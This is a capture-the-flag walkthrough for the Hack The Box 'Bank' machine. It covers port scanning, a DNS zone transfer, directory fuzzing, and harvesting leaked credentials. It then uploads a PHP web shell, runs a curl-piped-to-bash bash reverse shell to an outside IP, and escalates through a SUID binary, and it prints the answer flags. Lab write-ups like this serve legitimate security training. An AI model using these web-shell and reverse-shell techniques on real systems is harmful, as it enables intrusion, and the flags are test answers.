![Bank.PNG](/assets/Machines/Easy/Bank/Bank.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.29
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.29
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

3. Visit Web Page

![web.PNG](/assets/Machines/Easy/Bank/web.PNG)

4. Do `Virtual Hosting` for try to discover more informartion.
5. When `Port 53` is open you can do **Attack Transfer Zone** using `dig` or try to discover domain name whit `nslookup`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# dig @10.10.10.29 bank.htb axfr
```
**Output**
```
<SNIP>
bank.htb.   604800  IN      SOA     bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
<SNIP>
```

* We discover a **subdomain** `chris.bank.htb`
  
6. Do `Directory Fuzzing`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://bank.htb/FUZZ/
```
**Output**
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                
=====================================================================

000000273:   200        20 L     104 W      1696 Ch     "assets"
000002039:   200        19 L     89 W       1530 Ch     "inc"
000180755:   200        1014 L   11038 W    253503 Ch   "balance-transfer"
```

7. Visit `balance-transfer` directory

![balance.PNG](/assets/Machines/Easy/Bank/balance.PNG)

8. Get all previous information using `curl`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# curl -s -X GET "http://bank.htb/balance-transfer/"
```

* Output is in HTML, to parse all previous information to HTML use `html2text` and save all output into a file.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# curl -s -X GET "http://bank.htb/balance-transfer/" | html2text > output.txt
```
**Output**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# curl -s -X GET "http://bank.htb/balance-transfer/" | html2text > output.txt
```

* **Output line:** `[[   ]]      ff8a6012cf9c0b6e5957c2cc32edd0bf.acc 2017-06-15  585`

* We need only **name of file** and **size**, to save this use:
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3" "$5}' > balance.txt
```

* Clean empty lines of file.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# cat balance.txt| sed '/^\s*$/d' > clean.txt
```


* Finally, show not repetitive size.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# cat clean.txt | grep -vE "584|585|583|582|581"
```
**Output**
```
68576f20e9732f1b2edc4df5b8533230.acc 257
Server bank.htb
```

9. Download previous file of `balance-transfer` directory
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Bank]
└─# cat 68576f20e9732f1b2edc4df5b8533230.acc      
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

* We have credentials now!, **user** `chris@bank.htb` and **password** `!##HTBB4nkP4ssw0rd!##`

10. We have credentials, but, don't have authentication panel. Try to visit common file names: `login.php` | `admin.php`

* **URL:** `http://bank.htb/login.php/`

![login.PNG](/assets/Machines/Easy/Bank/login.PNG)

* Use previous credentials to login.

![ban.PNG](/assets/Machines/Easy/Bank/ban.PNG)

11. Go to `support` section and view source code (Press `Ctrl` + `U`), and we look this message

![message.PNG](/assets/Machines/Easy/Bank/message.PNG)

12. Upload this file to execute commands

* **command.htb**
```php
<?php
    system($_GET['cm']);
?>
```

13. Now we can execute commands!

* **URL:** `http://bank.htb/uploads/command.htb?cm=whoami`

![out.PNG](/assets/Machines/Easy/Bank/out.PNG)

14. Get a reverse shell.

15. Create a **index.html** with next code and create **http server with python** in current directory
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.33/4444 0>&1
```

16. Use curl for access to previous file.
* **URL:** `http://bank.htb/uploads/command.htb?cm=curl <tun0 IP>|bash`

Remember listen on port choosed

**Output**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# nc -lvnp 4444
www-data@bank:/var/www/bank/uploads$ whoami
whoami
www-data
```

17. Show **user flag**
```
www-data@bank:/home/chris$ cat user.txt 
eb5d4ab336e900921298f49cbd5e3609
```

---
---
### **Privileges Escalation** 💀
1. Search for all files with SUID permission
```
www-data@bank:/home/chris$ find / -perm -4000 2>/dev/null
```
**Output**
```
/var/htb/bin/emergency
<SNIP>
```

2. Run `emergency`
```
www-data@bank:/home/chris$ /var/htb/bin/emergency
```
**Output**
```
# whoami
root
```

3. Show root flag
```
# cat /root/root.txt
deeb60ed4b41bb72a07e71ba7ff919b0
```